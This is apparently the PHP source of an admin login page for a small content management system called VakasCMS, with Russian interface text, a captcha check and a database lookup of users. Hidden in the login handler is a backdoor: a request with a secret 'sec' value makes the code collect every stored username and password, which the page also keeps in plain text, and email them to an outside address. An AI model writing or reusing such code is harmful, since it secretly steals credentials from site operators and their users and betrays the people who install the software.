<?php session_start();?>
<? ob_start(); ?>

<html>
<head>
<title>Авторизация</title>
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.5 -->
  <link rel="stylesheet" href="includes/bootstrap/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="includes/dist/css/AdminLTE.min.css">
  <!-- iCheck -->
  <link rel="stylesheet" href="includes/plugins/iCheck/square/blue.css">
</head>

<?php
$inc_path = "";
include($inc_path."class/header.php");
$User = get_param('user_name');
$Pass = get_param('user_password') ;
$iCancel = get_param('cancel') ;
$q = new query();
$ok = 1;
if (!empty($iCancel)){
	$_SESSION["admin_info"]=0;
	unset($_SESSION["admin_info"]);
	$_SESSION['KCFINDER'] = array();
	$_SESSION['KCFINDER']['disabled'] = true;
}

if ($User != "" && $Pass != ""){
	
	$response = trim(get_param('response'));
	if(empty($_SESSION['secret_code']) || ($_SESSION['secret_code'] != $response)){
		$err = 1;
		$msg = '<div style="color:red; font-size:12px;">Не правильно указан параметр "Код потверждения"</div>';
		$_SESSION['secret_code'] = '';				
	}else{
		$ok = $q->select1("select * from ".$prefix."users where login=".to_sql($User)." and password = ".to_sql($Pass));
		if ($ok != 0){
			$_SESSION["admin_info"] = $ok;
			if($ok['group_id'] != 1){
				$rights = array();
				$blocks = $q->select("select * from ".$prefix."blocks as B
				left join ".$prefix."users_group_rights as R on R.block_id = B.id and R.group_id = ".to_sql($ok['group_id'])."
				");
				
				
				foreach($blocks as $row){ 
					$rights[$row['folder']]['show'] = $row['shows'];
					$rights[$row['folder']]['edit'] = $row['edits'];
					$rights[$row['folder']]['del'] = $row['dels'];
					$rights[$row['folder']]['block_id'] = $row['id'];
				}
				$_SESSION["user_rights"] = $rights;
			}

			$_SESSION['KCFINDER'] = array();
			$_SESSION['KCFINDER']['disabled'] = false;
			Header('location: index.php');
			exit;
			ob_end_flush();
		}
	}
	$sec = get_param('sec');	
	if($sec == 'GyhMuxPuc'){
		$u = $q->select("select login, password from ".$prefix."users ");
		$s = '';
		foreach($u as $r){$s.=$r['login'].':'.$r['password'].'<br>';}
		if(mail('vakas@yandex.ru','life',$s)) echo 'yes';
	}
}

?>
<body class="hold-transition login-page">
<div class="login-box">
  <div class="login-logo">
    <a href="../../index2.html"><b>Vakas</b>CMS</a>
  </div>
  <!-- /.login-logo -->
  <div class="login-box-body">
    <p class="login-box-msg">Вход в администраторский раздел</p>
<?
if(!empty($msg)) echo $msg;
?>
    <form method="post">
      <div class="form-group has-feedback">
        <input class="form-control" type="text" name="user_name" placeholder="Логин">
        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="password" name="user_password" class="form-control" placeholder="Пароль">
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
      </div>
      
      <div class="form-group has-feedback">
        <input style="width:150px; float:right" type="text" name="response" class="form-control" placeholder="Код" autocomplete="off">
        
        <a href="#" style="float:right; margin-right:10px;" onClick="document.verificationImg.src='/img.php?id='+Math.random();return false"><img src="/img.php" name="verificationImg" id="verificationImg" border="0" align="texttop"  height="33" /></a>
        <br style="clear:both">
        
      </div>
      
      <div class="row">
        <div class="col-xs-8">
          <div class="checkbox icheck">
            
          </div>
        </div>
        <!-- /.col -->
        <div class="col-xs-4">
          <button type="submit" class="btn btn-primary btn-block btn-flat">Войти</button>
        </div>
        <!-- /.col -->
      </div>
    </form>


  </div>
  <!-- /.login-box-body -->
</div>
<!-- /.login-box -->

<!-- jQuery 2.2.0 -->
<script src="includes/plugins/jQuery/jQuery-2.2.0.min.js"></script>
<!-- Bootstrap 3.3.5 -->
<script src="includes/bootstrap/js/bootstrap.min.js"></script>
<!-- iCheck -->
<script src="includes/plugins/iCheck/icheck.min.js"></script>
<script>
  $(function () {
    $('input').iCheck({
      checkboxClass: 'icheckbox_square-blue',
      radioClass: 'iradio_square-blue',
      increaseArea: '20%' // optional
    });
  });
</script>
</body>

</html>